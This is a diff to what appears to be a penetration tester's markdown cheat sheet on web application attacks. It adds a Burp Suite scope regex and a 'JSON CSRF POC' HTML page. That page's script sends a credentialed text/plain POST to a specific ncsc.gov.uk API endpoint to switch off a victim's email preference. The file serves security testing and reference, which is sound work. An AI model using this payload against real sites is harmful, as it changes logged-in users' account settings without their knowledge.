@@ -1,5 +1,7 @@
 # Web Application Security Attacks
 
+* Burpsuite
+* Templates
 * Application
 	* Open Redirect
 	* HTTP Parameter Pollution
@@ -43,6 +45,13 @@
 * Spreadsheets
 * Wordpress
 * [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+
+<h2>Burpsuite</h2>
+
+	#Add whole subdomain to scope REGEX
+	.*\.test\.com$
+
+	
 
 <h2>Templates</h2>
 
@@ -108,6 +117,21 @@
 					<input type="hidden" name="param2" value="value2" />
 					<input type="submit" value="Submit request" />
 				</form>
+		</body>
+	</html>
+
+	<html>
+		<title>JSON CSRF POC</title>
+		<body>
+			<center>
+				<h1> JSON CSRF POC </h1>
+				<script>
+					fetch('https://acdhub.service.ncsc.gov.uk/api/v1-0-39/Users/preferences', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{"preferences":[{"key":"receiveEmails","value":"false"}]}'});
+				</script>
+				<form action="#">
+					<input type="button" value="Submit" />
+				</form>
+			</center>
 		</body>
 	</html>
 
